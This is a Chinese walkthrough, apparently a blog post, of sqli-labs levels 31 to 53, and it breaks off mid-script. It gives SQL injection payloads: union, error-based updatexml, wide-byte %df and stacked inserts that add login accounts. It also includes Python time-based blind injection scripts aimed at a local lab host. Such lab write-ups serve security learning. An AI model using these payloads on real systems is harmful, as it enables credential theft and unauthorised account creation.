+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,<span class="hljs-string">&quot;~&quot;</span>,username,<span class="hljs-string">&quot;~&quot;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users-- -<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_17-19-03.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_17-19-03"></p>
+<h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>本关会出现sql语句报错，所以可以使用报错注入。也可以使用联合查询直接输出。本关使用<code>(&quot;&quot;)</code>闭合。（试出来的）</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span>&quot;) union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users -- -  //联合查询<br><br>?id=0&quot;) <span class="hljs-keyword">union</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">-- -  //报错查询</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_17-24-42.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_17-24-42"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_17-26-07.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_17-26-07"></p>
+<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>第三十二关使用preg_replace函数将 斜杠，单引号和双引号过滤了，如果输入id&#x3D;1”会变成id&#x3D;1\“,使得引号不起作用，但是可以注意到数据库使用了gbk编码。这里我们可以采用宽字节注入。当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%df</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span>group_concat(password<span class="hljs-punctuation">,</span>username)<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>users-- -<br></code></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imge7a44bc3e4174ca1a1984d1a0b1481c7.png" srcset="/img/loading.gif" lazyload alt="img"></h2><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-07-48.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_19-07-48"></p>
+<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p>和less-32一模一样。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-10-33.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_19-10-33"></p>
+<h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>输入admin admin能正常输出:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-19-52.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_19-19-52"></p>
+<p>需要使用宽字符注入。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users-- -<br><br>乱码是%df<br></code></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-39-43.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_19-39-43"  />
+
+
+
+
+
+<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p>本关没有闭合可以直接使用联合查询。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-54-37.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_19-54-37"></p>
+<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p>本关会将<code>&#39;</code>注释，需要使用宽字符注入。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>%df&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-00-57.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_20-00-57"></p>
+<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>本关时使用post请求传参，也是使用宽字符注入。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users-- -<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-05-04.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_20-05-04"></p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h3><p>本关判断闭合再判断字段数就可以进行联合查询了。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-08-47.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_20-08-47"></p>
+<p>也可以使用堆叠注入。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;38&#x27;</span>,<span class="hljs-string">&#x27;less38&#x27;</span>,<span class="hljs-string">&#x27;hello&#x27;</span>)--+<br>#向数据表插入自己的账户密码<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img297af58826ab4ef18e9118df55757229.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h3><p>使用正常的联合注入就可以了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-25-54.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_20-25-54"></p>
+<h3 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h3><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-29-02.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_20-29-02"></p>
+<p>使用<code>(&#39;&#39;)</code>闭合。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-41-03.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_20-41-03"></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27;) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h3><p>和less-40一致，只是没有闭合。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-42-52.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_20-42-52"></p>
+<h3 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h3><p>username将输入进行了转移，而password没有进行转移，所以可以再password中进行注入，进新房报错注入。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))-- -<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_21-07-59.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_21-07-59"></p>
+<h3 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h3><p>和less-42一致，只是将闭合变成了<code>(&#39;&#39;)</code>。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;) and (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))-- -<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_21-10-45.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_21-10-45"></p>
+<h3 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h3><p>在登录页面没有报错了，只能进行堆叠注入。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;42&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)-- -<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_21-13-51.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_21-13-51"></p>
+<p>成功登录a的账号。</p>
+<p>less-44没有输出报错信息不能用报错注入。</p>
+<h3 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h3><p>和less-44一样，也不能报错注入，只能堆叠注入。闭合</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;45&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)-- -<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_14-03-42.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_14-03-42"></p>
+<p>能登录a账号。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_14-04-49.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_14-04-49"></p>
+<h3 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h3><p>查看源码，发现<code>$id</code>传输的值是sort，而不是原来的id，所以要在网页传输数据时需要写sort。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-20-37.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_19-20-37"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-28-21.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_19-28-21"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-30-08.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_19-30-08"></p>
+<p>令sort&#x3D;1能正常输出表格，为0时没有结果。且可以发现本关时会输出sql的报错信息，所以可以进行报错注入。</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-32-10.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_19-32-10"></p>
+<h3 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h3><p>和less-46一致只是本关使用了<code>&#39;&#39;</code>闭合。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-36-36.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_19-36-36"></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?sort=<span class="hljs-number">0</span>&#x27; <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h3><p>本关不显示报错信息无法使用报错注入。可以使用延时注入。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">id</span>=1 and <span class="hljs-keyword">if</span>(ascii(substr(database(),1,1))=115,<span class="hljs-built_in">sleep</span>(2),1)-- -<br>//延时注入 需要在<span class="hljs-built_in">sort</span>后面加上<span class="hljs-built_in">id</span>否则使用<span class="hljs-built_in">sleep</span>（）睡眠时间很长<br></code></pre></td></tr></table></figure>
+
+<p>延时注入脚本</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><span class="hljs-keyword">session</span> = requests.<span class="hljs-keyword">session</span>()<br><br><span class="hljs-type">name</span>=<span class="hljs-string">&#x27;&#x27;</span><br>url=&quot;http://192.168.2.85/sqli/Less-48/?sort=id=1&quot; <br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">65</span>,<span class="hljs-number">123</span>):<br>        <br>        paramsGet = url + &quot;/**/and/**/if(ascii(substring(database(),&#123;0&#125;,1)) = &#123;1&#125;,sleep(3),1)-- -&quot;.format(j,i)<br>        start_time = <span class="hljs-type">time</span>.time()<br><br>        response = requests.<span class="hljs-keyword">get</span>(paramsGet)<br>        end_time = <span class="hljs-type">time</span>.time()<br>        elapsed_time = end_time - start_time<br><br>        <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">3</span>:<br>            <span class="hljs-type">name</span> += chr(i)<br>            print(<span class="hljs-type">name</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-21-59.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_20-21-59"></p>
+<h3 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h3><p>本关和less-48基本一致，只是闭合为<code>&#39;&#39;</code>。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?sort=<span class="hljs-string">&#x27;or id=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),1)-- -</span><br><span class="hljs-string">//需要使用id否则速度很慢</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">import requests</span><br><span class="hljs-string">import time</span><br><span class="hljs-string">session = requests.session()</span><br><span class="hljs-string"></span><br><span class="hljs-string">name=&#x27;&#x27;</span><br><span class="hljs-string">url=&quot;http://192.168.2.85/sqli/Less-49/?sort=&#x27;</span><span class="hljs-keyword">or</span> id=<span class="hljs-string">&#x27;1&#x27;</span>&quot; <br><br>for j in range(1,10):<br>    for i in range(65,123):<br>        <br>        paramsGet = url + &quot;<span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substring(<span class="hljs-keyword">database</span>(),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) = &#123;<span class="hljs-number">1</span>&#125;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- -&quot;.format(j,i)</span><br>        start_time = <span class="hljs-type">time</span>.time()<br><br>        response = requests.<span class="hljs-keyword">get</span>(paramsGet)<br>        end_time = <span class="hljs-type">time</span>.time()<br>        elapsed_time = end_time - start_time<br><br>        <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">3</span>:<br>            <span class="hljs-type">name</span> += chr(i)<br>            print(<span class="hljs-type">name</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-33-49.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_20-33-49"></p>
+<h3 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h3><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-37-19.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_20-37-19"></p>
+<p>本关会显示sql的报错信息，使用报错注入。</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-38-43.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_20-38-43"></p>
+<h3 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h3><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-39-35.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_20-39-35"></p>
+<p>和less-50一致，闭合为<code>&#39;&#39;</code>直接使用报错注入。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?sort=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-41-47.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_20-41-47"></p>
+<h3 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h3><p>本关没法使用报错注入了。使用睡眠注入。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?sort=id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,sleep(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br>import <span class="hljs-built_in">time</span><br>session = requests.session()<br><br>name=&#x27;&#x27;<br># <span class="hljs-built_in">sort</span>=id=<span class="hljs-number">1</span>    , <span class="hljs-built_in">sort</span>=&#x27;<span class="hljs-keyword">or</span> id=&#x27;<span class="hljs-number">1</span>&#x27;<br>url=<span class="hljs-string">&quot;http://192.168.2.85/sqli/Less-52/?sort=id=1&quot;</span> <br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65</span>,<span class="hljs-number">123</span>):<br>        <br>        paramsGet = url + <span class="hljs-string">&quot;/**/and/**/if(ascii(substring(database(),&#123;0&#125;,1)) = &#123;1&#125;,sleep(3),1)-- -&quot;</span>.format(j,i)<br>        start_time = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br><br>        response = requests.<span class="hljs-built_in">get</span>(paramsGet)<br>        end_time = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>        elapsed_time = end_time - start_time<br><br>        <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">3</span>:<br>            name += chr(i)<br>            <span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-59-28.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_20-59-28"></p>
+<h3 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h3><p>和less-49一致，闭合也是<code>&#39;&#39;</code>。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?sort=<span class="hljs-symbol">&#x27;or</span> id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,sleep(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><span class="hljs-keyword">session</span> = requests.<span class="hljs-keyword">session</span>()<br><br><span class="hljs-type">name</span>=<span class="hljs-string">&#x27;&#x27;</span><br># sort=id=<span class="hljs-number">1</span>    , sort=<span class="hljs-string">&#x27;or id=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">url=&quot;http://192.168.2.85/sqli/Less-53/?sort=&#x27;</span><span class="hljs-keyword">or</span> id=<span class="hljs-string">&#x27;1&#x27;</span>&quot; <br><br>for j in range(1,10):<br>    for i in range(65,123):<br>        <br>        paramsGet = url + &quot;<span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substring(<span class="hljs-keyword">database</span>(),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) = &#123;<span class="hljs-number">1</span>&#125;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- -&quot;.format(j,i)</span><br>        start_time = <span class="hljs-type">time</span>.time()<br><br>        response = requests.<span class="hljs-keyword">get</span>(paramsGet)<br>        end_time = <span 